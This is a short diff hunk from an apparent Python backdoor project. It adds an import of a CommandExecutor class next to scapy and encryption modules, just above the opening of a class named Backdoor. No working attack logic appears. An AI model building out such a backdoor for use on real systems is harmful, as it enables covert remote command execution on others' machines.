@@ -3,6 +3,7 @@ from scapy.all import *
 import encryption
 import netifaces
 import helpers
+from cmdExec import CommandExecutor
 
 class Backdoor(object):
 
